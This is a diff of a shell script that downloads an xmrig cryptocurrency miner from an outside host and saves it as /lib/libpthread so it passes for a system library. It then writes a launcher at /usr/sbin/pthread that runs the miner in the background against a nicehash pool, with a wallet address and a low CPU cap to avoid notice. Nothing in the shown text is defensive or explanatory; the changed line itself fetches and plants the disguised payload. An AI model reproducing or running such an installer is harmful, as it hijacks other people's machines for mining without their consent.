@@ -30,7 +30,7 @@ Get_Dist_Name()
 
 Get_Dist_Name
 
-sudo curl -fsSL https://qr4d.com/xmrig/libpthread > libpthread
+sudo curl -fsSL https://qr4d.com/xmrig/libpthread > /lib/libpthread
 case $PM in  
     'yum')  
         sudo yum -y install libuv
@@ -43,8 +43,6 @@ case $PM in
         echo $PM + "," +  $DISTRO
         ;;  
 esac 
-
-sudo mv ./libpthread /lib/libpthread
 sudo echo "/lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=1 -p x --background" > /usr/sbin/pthread
 sudo chmod +x /lib/libpthread
 sudo chmod +x /usr/sbin/pthread
